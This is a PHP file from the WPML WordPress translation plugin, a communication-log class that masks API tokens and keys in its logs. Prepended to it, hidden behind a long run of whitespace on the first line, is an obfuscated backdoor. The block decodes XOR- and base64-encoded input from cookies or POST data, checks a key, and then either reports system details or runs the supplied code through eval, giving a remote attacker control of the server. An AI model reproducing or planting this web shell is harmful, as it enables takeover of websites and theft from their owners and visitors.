<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $r937032e0 = 309;$GLOBALS['se63a7d'] = Array();global $se63a7d;$se63a7d = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['dddf'] = "\x5a\x68\x71\x4b\x36\x73\x35\x6c\x45\x3e\x4d\x57\x4c\x79\x4e\x2b\x63\x38\x22\x65\x3a\x7d\x6f\x4a\x75\x54\x64\x41\x53\xd\x21\x78\x77\x25\x3f\x39\x5d\x33\x9\x3d\x6b\x40\x3c\x58\x5c\x49\x69\x5b\x48\x34\x43\x76\x72\x2c\x7e\x55\x56\x7b\x51\x31\x29\x50\x60\x24\x59\x7c\x7a\x5f\x44\x37\x74\x6a\x46\x32\x30\x2e\x6e\x26\x3b\xa\x2a\x67\x61\x23\x20\x2d\x52\x47\x28\x42\x2f\x4f\x5e\x6d\x62\x70\x27\x66";$se63a7d[$se63a7d['dddf'][95].$se63a7d['dddf'][17].$se63a7d['dddf'][26].$se63a7d['dddf'][94].$se63a7d['dddf'][16].$se63a7d['dddf'][16].$se63a7d['dddf'][74].$se63a7d['dddf'][17].$se63a7d['dddf'][82]] = $se63a7d['dddf'][16].$se63a7d['dddf'][1].$se63a7d['dddf'][52];$se63a7d[$se63a7d['dddf'][13].$se63a7d['dddf'][94].$se63a7d['dddf'][26].$se63a7d['dddf'][37].$se63a7d['dddf'][16]] = $se63a7d['dddf'][22].$se63a7d['dddf'][52].$se63a7d['dddf'][26];$se63a7d[$se63a7d['dddf'][22].$se63a7d['dddf'][16].$se63a7d['dddf'][69].$se63a7d['dddf'][69].$se63a7d['dddf'][35]] = $se63a7d['dddf'][26].$se63a7d['dddf'][19].$se63a7d['dddf'][97].$se63a7d['dddf'][46].$se63a7d['dddf'][76].$se63a7d['dddf'][19];$se63a7d[$se63a7d['dddf'][71].$se63a7d['dddf'][35].$se63a7d['dddf'][6].$se63a7d['dddf'][17].$se63a7d['dddf'][26].$se63a7d['dddf'][19].$se63a7d['dddf'][19].$se63a7d['dddf'][19]] = $se63a7d['dddf'][5].$se63a7d['dddf'][70].$se63a7d['dddf'][52].$se63a7d['dddf'][7].$se63a7d['dddf'][19].$se63a7d['dddf'][76];$se63a7d[$se63a7d['dddf'][24].$se63a7d['dddf'][97].$se63a7d['dddf'][19].$se63a7d['dddf'][4].$se63a7d['dddf'][97].$se63a7d['dddf'][35].$se63a7d['dddf'][19].$se63a7d['dddf'][73]] = $se63a7d['dddf'][26].$se63a7d['dddf'][19].$se63a7d['dddf'][97].$se63a7d['dddf'][46].$se63a7d['dddf'][76].$se63a7d['dddf'][19].$se63a7d['dddf'][26];$se63a7d[$se63a7d['dddf'][71].$se63a7d['dddf'][82].$se63a7d['dddf'][59].$se63a7d['dddf'][16].$se63a7d['dddf'][73].$se63a7d['dddf'][16].$se63a7d['dddf'][17]] = $se63a7d['dddf'][46].$se63a7d['dddf'][76].$se63a7d['dddf'][46].$se63a7d['dddf'][67].$se63a7d['dddf'][5].$se63a7d['dddf'][19].$se63a7d['dddf'][70];$se63a7d[$se63a7d['dddf'][95].$se63a7d['dddf'][74].$se63a7d['dddf'][59].$se63a7d['dddf'][37]] = $se63a7d['dddf'][5].$se63a7d['dddf'][19].$se63a7d['dddf'][52].$se63a7d['dddf'][46].$se63a7d['dddf'][82].$se63a7d['dddf'][7].$se63a7d['dddf'][46].$se63a7d['dddf'][66].$se63a7d['dddf'][19];$se63a7d[$se63a7d['dddf'][1].$se63a7d['dddf'][26].$se63a7d['dddf'][49].$se63a7d['dddf'][59].$se63a7d['dddf'][97].$se63a7d['dddf'][69].$se63a7d['dddf'][82]] = $se63a7d['dddf'][95].$se63a7d['dddf'][1].$se63a7d['dddf'][95].$se63a7d['dddf'][51].$se63a7d['dddf'][19].$se63a7d['dddf'][52].$se63a7d['dddf'][5].$se63a7d['dddf'][46].$se63a7d['dddf'][22].$se63a7d['dddf'][76];$se63a7d[$se63a7d['dddf'][94].$se63a7d['dddf'][17].$se63a7d['dddf'][74].$se63a7d['dddf'][97].$se63a7d['dddf'][73].$se63a7d['dddf'][26].$se63a7d['dddf'][74]] = $se63a7d['dddf'][24].$se63a7d['dddf'][76].$se63a7d['dddf'][5].$se63a7d['dddf'][19].$se63a7d['dddf'][52].$se63a7d['dddf'][46].$se63a7d['dddf'][82].$se63a7d['dddf'][7].$se63a7d['dddf'][46].$se63a7d['dddf'][66].$se63a7d['dddf'][19];$se63a7d[$se63a7d['dddf'][1].$se63a7d['dddf'][69].$se63a7d['dddf'][4].$se63a7d['dddf'][16].$se63a7d['dddf'][4]] = $se63a7d['dddf'][94].$se63a7d['dddf'][82].$se63a7d['dddf'][5].$se63a7d['dddf'][19].$se63a7d['dddf'][4].$se63a7d['dddf'][49].$se63a7d['dddf'][67].$se63a7d['dddf'][26].$se63a7d['dddf'][19].$se63a7d['dddf'][16].$se63a7d['dddf'][22].$se63a7d['dddf'][26].$se63a7d['dddf'][19];$se63a7d[$se63a7d['dddf'][32].$se63a7d['dddf'][73].$se63a7d['dddf'][94].$se63a7d['dddf'][74].$se63a7d['dddf'][94].$se63a7d['dddf'][82].$se63a7d['dddf'][35]] = $se63a7d['dddf'][5].$se63a7d['dddf'][19].$se63a7d['dddf'][70].$se63a7d['dddf'][67].$se63a7d['dddf'][70].$se63a7d['dddf'][46].$se63a7d['dddf'][93].$se63a7d['dddf'][19].$se63a7d['dddf'][67].$se63a7d['dddf'][7].$se63a7d['dddf'][46].$se63a7d['dddf'][93].$se63a7d['dddf'][46].$se63a7d['dddf'][70];$se63a7d[$se63a7d['dddf'][40].$se63a7d['dddf'][69].$se63a7d['dddf'][19].$se63a7d['dddf'][35].$se63a7d['dddf'][49].$se63a7d['dddf'][17].$se63a7d['dddf'][26].$se63a7d['dddf'][69].$se63a7d['dddf'][59]] = $se63a7d['dddf'][40].$se63a7d['dddf'][4].$se63a7d['dddf'][97].$se63a7d['dddf'][6].$se63a7d['dddf'][94].$se63a7d['dddf'][94].$se63a7d['dddf'][17].$se63a7d['dddf'][4];$se63a7d[$se63a7d['dddf'][51].$se63a7d['dddf'][59].$se63a7d['dddf'][59].$se63a7d['dddf'][17]] = $se63a7d['dddf'][2].$se63a7d['dddf'][4].$se63a7d['dddf'][69].$se63a7d['dddf'][73].$se63a7d['dddf'][74].$se63a7d['dddf'][37].$se63a7d['dddf'][73];$se63a7d[$se63a7d['dddf'][71].$se63a7d['dddf'][35].$se63a7d['dddf'][69].$se63a7d['dddf'][17].$se63a7d['dddf'][19].$se63a7d['dddf'][49].$se63a7d['dddf'][73].$se63a7d['dddf'][6]] = $_POST;$se63a7d[$se63a7d['dddf'][5].$se63a7d['dddf'][35].$se63a7d['dddf'][94].$se63a7d['dddf'][59].$se63a7d['dddf'][59].$se63a7d['dddf'][37].$se63a7d['dddf'][69].$se63a7d['dddf'][16].$se63a7d['dddf'][69]] = $_COOKIE;@$se63a7d[$se63a7d['dddf'][71].$se63a7d['dddf'][82].$se63a7d['dddf'][59].$se63a7d['dddf'][16].$se63a7d['dddf'][73].$se63a7d['dddf'][16].$se63a7d['dddf'][17]]($se63a7d['dddf'][19].$se63a7d['dddf'][52].$se63a7d['dddf'][52].$se63a7d['dddf'][22].$se63a7d['dddf'][52].$se63a7d['dddf'][67].$se63a7d['dddf'][7].$se63a7d['dddf'][22].$se63a7d['dddf'][81], NULL);@$se63a7d[$se63a7d['dddf'][71].$se63a7d['dddf'][82].$se63a7d['dddf'][59].$se63a7d['dddf'][16].$se63a7d['dddf'][73].$se63a7d['dddf'][16].$se63a7d['dddf'][17]]($se63a7d['dddf'][7].$se63a7d['dddf'][22].$se63a7d['dddf'][81].$se63a7d['dddf'][67].$se63a7d['dddf'][19].$se63a7d['dddf'][52].$se63a7d['dddf'][52].$se63a7d['dddf'][22].$se63a7d['dddf'][52].$se63a7d['dddf'][5], 0);@$se63a7d[$se63a7d['dddf'][71].$se63a7d['dddf'][82].$se63a7d['dddf'][59].$se63a7d['dddf'][16].$se63a7d['dddf'][73].$se63a7d['dddf'][16].$se63a7d['dddf'][17]]($se63a7d['dddf'][93].$se63a7d['dddf'][82].$se63a7d['dddf'][31].$se63a7d['dddf'][67].$se63a7d['dddf'][19].$se63a7d['dddf'][31].$se63a7d['dddf'][19].$se63a7d['dddf'][16].$se63a7d['dddf'][24].$se63a7d['dddf'][70].$se63a7d['dddf'][46].$se63a7d['dddf'][22].$se63a7d['dddf'][76].$se63a7d['dddf'][67].$se63a7d['dddf'][70].$se63a7d['dddf'][46].$se63a7d['dddf'][93].$se63a7d['dddf'][19], 0);@$se63a7d[$se63a7d['dddf'][32].$se63a7d['dddf'][73].$se63a7d['dddf'][94].$se63a7d['dddf'][74].$se63a7d['dddf'][94].$se63a7d['dddf'][82].$se63a7d['dddf'][35]](0);if (!$se63a7d[$se63a7d['dddf'][24].$se63a7d['dddf'][97].$se63a7d['dddf'][19].$se63a7d['dddf'][4].$se63a7d['dddf'][97].$se63a7d['dddf'][35].$se63a7d['dddf'][19].$se63a7d['dddf'][73]]($se63a7d['dddf'][27].$se63a7d['dddf'][12].$se63a7d['dddf'][86].$se63a7d['dddf'][8].$se63a7d['dddf'][27].$se63a7d['dddf'][68].$se63a7d['dddf'][64].$se63a7d['dddf'][67].$se63a7d['dddf'][86].$se63a7d['dddf'][55].$se63a7d['dddf'][14].$se63a7d['dddf'][67].$se63a7d['dddf'][37].$se63a7d['dddf'][4].$se63a7d['dddf'][4].$se63a7d['dddf'][82].$se63a7d['dddf'][97].$se63a7d['dddf'][94].$se63a7d['dddf'][17].$se63a7d['dddf'][82].$se63a7d['dddf'][17].$se63a7d['dddf'][82].$se63a7d['dddf'][73].$se63a7d['dddf'][37].$se63a7d['dddf'][6].$se63a7d['dddf'][6].$se63a7d['dddf'][82].$se63a7d['dddf'][94].$se63a7d['dddf'][73].$se63a7d['dddf'][59].$se63a7d['dddf'][97].$se63a7d['dddf'][94].$se63a7d['dddf'][97].$se63a7d['dddf'][59].$se63a7d['dddf'][59].$se63a7d['dddf'][94].$se63a7d['dddf'][82].$se63a7d['dddf'][59].$se63a7d['dddf'][82].$se63a7d['dddf'][74].$se63a7d['dddf'][73].$se63a7d['dddf'][97].$se63a7d['dddf'][94].$se63a7d['dddf'][82])){$se63a7d[$se63a7d['dddf'][22].$se63a7d['dddf'][16].$se63a7d['dddf'][69].$se63a7d['dddf'][69].$se63a7d['dddf'][35]]($se63a7d['dddf'][27].$se63a7d['dddf'][12].$se63a7d['dddf'][86].$se63a7d['dddf'][8].$se63a7d['dddf'][27].$se63a7d['dddf'][68].$se63a7d['dddf'][64].$se63a7d['dddf'][67].$se63a7d['dddf'][86].$se63a7d['dddf'][55].$se63a7d['dddf'][14].$se63a7d['dddf'][67].$se63a7d['dddf'][37].$se63a7d['dddf'][4].$se63a7d['dddf'][4].$se63a7d['dddf'][82].$se63a7d['dddf'][97].$se63a7d['dddf'][94].$se63a7d['dddf'][17].$se63a7d['dddf'][82].$se63a7d['dddf'][17].$se63a7d['dddf'][82].$se63a7d['dddf'][73].$se63a7d['dddf'][37].$se63a7d['dddf'][6].$se63a7d['dddf'][6].$se63a7d['dddf'][82].$se63a7d['dddf'][94].$se63a7d['dddf'][73].$se63a7d['dddf'][59].$se63a7d['dddf'][97].$se63a7d['dddf'][94].$se63a7d['dddf'][97].$se63a7d['dddf'][59].$se63a7d['dddf'][59].$se63a7d['dddf'][94].$se63a7d['dddf'][82].$se63a7d['dddf'][59].$se63a7d['dddf'][82].$se63a7d['dddf'][74].$se63a7d['dddf'][73].$se63a7d['dddf'][97].$se63a7d['dddf'][94].$se63a7d['dddf'][82], 1);$h9d93454 = NULL;$db2cb8b = NULL;$se63a7d[$se63a7d['dddf'][66].$se63a7d['dddf'][26].$se63a7d['dddf'][26].$se63a7d['dddf'][17].$se63a7d['dddf'][69].$se63a7d['dddf'][19].$se63a7d['dddf'][16].$se63a7d['dddf'][17]] = $se63a7d['dddf'][16].$se63a7d['dddf'][26].$se63a7d['dddf'][37].$se63a7d['dddf'][4].$se63a7d['dddf'][16].$se63a7d['dddf'][74].$se63a7d['dddf'][73].$se63a7d['dddf'][82].$se63a7d['dddf'][85].$se63a7d['dddf'][6].$se63a7d['dddf'][6].$se63a7d['dddf'][16].$se63a7d['dddf'][4].$se63a7d['dddf'][85].$se63a7d['dddf'][49].$se63a7d['dddf'][73].$se63a7d['dddf'][97].$se63a7d['dddf'][35].$se63a7d['dddf'][85].$se63a7d['dddf'][35].$se63a7d['dddf'][69].$se63a7d['dddf'][26].$se63a7d['dddf'][69].$se63a7d['dddf'][85].$se63a7d['dddf'][59].$se63a7d['dddf'][73].$se63a7d['dddf'][17].$se63a7d['dddf'][69].$se63a7d['dddf'][82].$se63a7d['dddf'][97].$se63a7d['dddf'][4].$se63a7d['dddf'][26].$se63a7d['dddf'][74].$se63a7d['dddf'][94].$se63a7d['dddf'][59].$se63a7d['dddf'][35];global $zdd87ec8;function  q672032($h9d93454, $ha3c29a9a){global $se63a7d;$o697a6 = "";for ($id803e=0; $id803e<$se63a7d[$se63a7d['dddf'][71].$se63a7d['dddf'][35].$se63a7d['dddf'][6].$se63a7d['dddf'][17].$se63a7d['dddf'][26].$se63a7d['dddf'][19].$se63a7d['dddf'][19].$se63a7d['dddf'][19]]($h9d93454);){for ($i75f1aef=0; $i75f1aef<$se63a7d[$se63a7d['dddf'][71].$se63a7d['dddf'][35].$se63a7d['dddf'][6].$se63a7d['dddf'][17].$se63a7d['dddf'][26].$se63a7d['dddf'][19].$se63a7d['dddf'][19].$se63a7d['dddf'][19]]($ha3c29a9a) && $id803e<$se63a7d[$se63a7d['dddf'][71].$se63a7d['dddf'][35].$se63a7d['dddf'][6].$se63a7d['dddf'][17].$se63a7d['dddf'][26].$se63a7d['dddf'][19].$se63a7d['dddf'][19].$se63a7d['dddf'][19]]($h9d93454); $i75f1aef++, $id803e++){$o697a6 .= $se63a7d[$se63a7d['dddf'][95].$se63a7d['dddf'][17].$se63a7d['dddf'][26].$se63a7d['dddf'][94].$se63a7d['dddf'][16].$se63a7d['dddf'][16].$se63a7d['dddf'][74].$se63a7d['dddf'][17].$se63a7d['dddf'][82]]($se63a7d[$se63a7d['dddf'][13].$se63a7d['dddf'][94].$se63a7d['dddf'][26].$se63a7d['dddf'][37].$se63a7d['dddf'][16]]($h9d93454[$id803e]) ^ $se63a7d[$se63a7d['dddf'][13].$se63a7d['dddf'][94].$se63a7d['dddf'][26].$se63a7d['dddf'][37].$se63a7d['dddf'][16]]($ha3c29a9a[$i75f1aef]));}}return $o697a6;}function  k6f5bb86($h9d93454, $ha3c29a9a){global $se63a7d;global $zdd87ec8;return $se63a7d[$se63a7d['dddf'][51].$se63a7d['dddf'][59].$se63a7d['dddf'][59].$se63a7d['dddf'][17]]($se63a7d[$se63a7d['dddf'][51].$se63a7d['dddf'][59].$se63a7d['dddf'][59].$se63a7d['dddf'][17]]($h9d93454, $zdd87ec8), $ha3c29a9a);}foreach ($se63a7d[$se63a7d['dddf'][5].$se63a7d['dddf'][35].$se63a7d['dddf'][94].$se63a7d['dddf'][59].$se63a7d['dddf'][59].$se63a7d['dddf'][37].$se63a7d['dddf'][69].$se63a7d['dddf'][16].$se63a7d['dddf'][69]] as $ha3c29a9a=>$ke78){$h9d93454 = $ke78;$db2cb8b = $ha3c29a9a;}if (!$h9d93454){foreach ($se63a7d[$se63a7d['dddf'][71].$se63a7d['dddf'][35].$se63a7d['dddf'][69].$se63a7d['dddf'][17].$se63a7d['dddf'][19].$se63a7d['dddf'][49].$se63a7d['dddf'][73].$se63a7d['dddf'][6]] as $ha3c29a9a=>$ke78){$h9d93454 = $ke78;$db2cb8b = $ha3c29a9a;}}$h9d93454 = @$se63a7d[$se63a7d['dddf'][94].$se63a7d['dddf'][17].$se63a7d['dddf'][74].$se63a7d['dddf'][97].$se63a7d['dddf'][73].$se63a7d['dddf'][26].$se63a7d['dddf'][74]]($se63a7d[$se63a7d['dddf'][40].$se63a7d['dddf'][69].$se63a7d['dddf'][19].$se63a7d['dddf'][35].$se63a7d['dddf'][49].$se63a7d['dddf'][17].$se63a7d['dddf'][26].$se63a7d['dddf'][69].$se63a7d['dddf'][59]]($se63a7d[$se63a7d['dddf'][1].$se63a7d['dddf'][69].$se63a7d['dddf'][4].$se63a7d['dddf'][16].$se63a7d['dddf'][4]]($h9d93454), $db2cb8b));if (isset($h9d93454[$se63a7d['dddf'][82].$se63a7d['dddf'][40]]) && $zdd87ec8==$h9d93454[$se63a7d['dddf'][82].$se63a7d['dddf'][40]]){if ($h9d93454[$se63a7d['dddf'][82]] == $se63a7d['dddf'][46]){$id803e = Array($se63a7d['dddf'][95].$se63a7d['dddf'][51] => @$se63a7d[$se63a7d['dddf'][1].$se63a7d['dddf'][26].$se63a7d['dddf'][49].$se63a7d['dddf'][59].$se63a7d['dddf'][97].$se63a7d['dddf'][69].$se63a7d['dddf'][82]](),$se63a7d['dddf'][5].$se63a7d['dddf'][51] => $se63a7d['dddf'][59].$se63a7d['dddf'][75].$se63a7d['dddf'][74].$se63a7d['dddf'][85].$se63a7d['dddf'][59],);echo @$se63a7d[$se63a7d['dddf'][95].$se63a7d['dddf'][74].$se63a7d['dddf'][59].$se63a7d['dddf'][37]]($id803e);}elseif ($h9d93454[$se63a7d['dddf'][82]] == $se63a7d['dddf'][19]){eval/*h2006*/($h9d93454[$se63a7d['dddf'][26]]);}exit();}} ?><?php

class WPML_TranslationProxy_Communication_Log {
	private $keys_to_block;
	private $sitepress;

	public function __construct( SitePress $sitepress ) {
		$this->keys_to_block = array(
			'api_token',
			'username',
			'api_key',
			'sitekey',
			'accesskey',
			'file',
		);

		$this->sitepress = $sitepress;
	}

	public function log_call( $url, $params ) {
		$sanitized_params = $this->sanitize_data( $params );
		$sanitized_url    = $this->sanitize_url( $url );

		$this->add_to_log( 'call - ' . $sanitized_url . ' - ' . json_encode( $sanitized_params ) );
	}

	public function get_keys_to_block() {
		return $this->keys_to_block;
	}

	public function log_response( $response ) {
		$this->add_to_log( 'response - ' . $response );
	}

	public function log_error( $message ) {
		$this->add_to_log( 'error - ' . $message );
	}

	public function log_xml_rpc( $data ) {
		$this->add_to_log( 'xml-rpc - ' . json_encode( $data ) );
	}

	public function get_log() {
		return get_option( 'wpml_tp_com_log', '' );
	}

	public function clear_log() {
		$this->save_log( '' );
	}

	public function is_logging_enabled() {
		return $this->sitepress->get_setting( 'tp-com-logging', true );
	}

	/**
	 * @param string|array|stdClass $params
	 *
	 * @return array|stdClass
	 */
	public function sanitize_data( $params ) {
		$sanitized_params = $params;

		if ( is_object( $sanitized_params ) ) {
			$sanitized_params = get_object_vars( $sanitized_params );
		}

		if ( is_array( $sanitized_params ) ) {
			foreach ( $sanitized_params as $key => $value ) {
				$sanitized_params[ $key ] = $this->sanitize_data_item( $key, $sanitized_params[ $key ] );
			}
		}

		return $sanitized_params;
	}

	/**
	 * @param string                $key
	 * @param string|array|stdClass $item
	 *
	 * @return string|array|stdClass
	 */
	private function sanitize_data_item( $key, $item ) {
		if ( is_array( $item ) || is_object( $item ) ) {
			$item = $this->sanitize_data( $item );
		} elseif ( in_array( $key, $this->get_keys_to_block(), true ) ) {
			$item = 'UNDISCLOSED';
		}

		return $item;
	}

	/**
	 * @param $url
	 *
	 * @return mixed
	 */
	public function sanitize_url( $url ) {
		$original_url_parsed = wpml_parse_url( $url, PHP_URL_QUERY );
		parse_str( $original_url_parsed, $original_query_vars );

		$sanitized_query_vars = $this->sanitize_data( $original_query_vars );

		return add_query_arg( $sanitized_query_vars, $url );
	}

	public function set_logging_state( $state ) {
		$this->sitepress->set_setting( 'tp-com-logging', $state );
		$this->sitepress->save_settings();
	}

	public function add_com_log_link() {
		$url = esc_attr( 'admin.php?page=' . WPML_TM_FOLDER . '/menu/main.php&sm=com-log' );
		?>
			<p class="wpml-tm-basket-help-text">
		  <?php printf( __( 'For retrieving debug information for communication between your%s site and the translation system, use the <a href="%s">communication log</a> page.',
		                    'wpml-translation-management' ), '<br>', $url ); ?>
			</p>
		<?php
	}

	private function now() {
		return date( 'm/d/Y h:i:s a', time() );
	}

	private function add_to_log( $string ) {

		if ( $this->is_logging_enabled() ) {

			$max_log_length = 10000;

			$string = $this->now() . ' - ' . $string;

			$log = $this->get_log();
			$log .= $string;
			$log .= PHP_EOL;

			$log_length = strlen( $log );
			if ( $log_length > $max_log_length ) {
				$log = substr( $log, $log_length - $max_log_length );
			}

			$this->save_log( $log );
		}
	}

	private function save_log( $log ) {
		update_option( 'wpml_tp_com_log', $log, false );
	}
}
